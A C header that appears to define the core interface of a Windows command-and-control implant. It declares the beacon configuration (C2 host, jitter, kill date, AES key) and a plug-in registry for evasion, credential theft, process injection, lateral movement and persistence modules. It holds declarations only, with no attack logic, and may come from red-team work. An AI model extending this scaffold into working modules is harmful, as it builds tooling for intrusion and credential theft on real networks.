#ifndef AGENT_H
#define AGENT_H

#include <windows.h>
#include <stddef.h>

typedef struct _Module Module;
typedef struct _AgentConfig AgentConfig;
typedef struct _AgentOutput AgentOutput;

/* agent config */

typedef struct _AgentConfig {
    char      agent_id[64];
    char      hostname[256];
    char      username[256];
    char      domain[256];
    DWORD     pid;
    DWORD     ppid;
    char      process_name[260];
    BOOL      is_elevated;
    WORD      arch;

    char      c2_host[256];
    char      c2_port[16];
    char      c2_path[256];
    void     *transport;

    DWORD     sleep_ms;
    DWORD     jitter_pct;
    ULONGLONG kill_date;

    BYTE      aes_key[32];
    BYTE      aes_iv[16];

    Module   *modules;
    int       module_count;

    BOOL      running;
    BOOL      debug;
} AgentConfig;

/* module output */

#define OUTPUT_TYPE_TEXT   0
#define OUTPUT_TYPE_BINARY 1
#define OUTPUT_TYPE_ERROR  2
#define OUTPUT_TYPE_EMPTY  3

typedef struct _AgentOutput {
    int       type;
    void     *data;
    size_t    data_len;
    int       error_code;
} AgentOutput;

/* module interface */

typedef int (*ModuleExecFn)(AgentConfig *config, const void *args, size_t args_len, AgentOutput *output);
typedef int  (*ModuleInitFn)(AgentConfig *config);
typedef void (*ModuleCleanupFn)(AgentConfig *config);

typedef struct _Module {
    const char     *name;
    const char     *category;
    const char     *description;

    ModuleInitFn    init;
    ModuleExecFn    exec;
    ModuleCleanupFn cleanup;

    BOOL            needs_admin;
    BOOL            opsec_safe;
} Module;

/* module registry */

int module_register(AgentConfig *config, const Module *mod);
Module *module_find(AgentConfig *config, const char *name);
int module_dispatch(AgentConfig *config, const char *name, const void *args, size_t args_len, AgentOutput *output);
void output_free(AgentOutput *output);

/* library registration prototypes */

int postex_register(AgentConfig *config);
int recon_register(AgentConfig *config);
int evasion_register(AgentConfig *config);
int credentials_register(AgentConfig *config);
int injection_register(AgentConfig *config);
int lateral_register(AgentConfig *config);
int persistence_register(AgentConfig *config);
int comms_register(AgentConfig *config);

#endif /* AGENT_H */
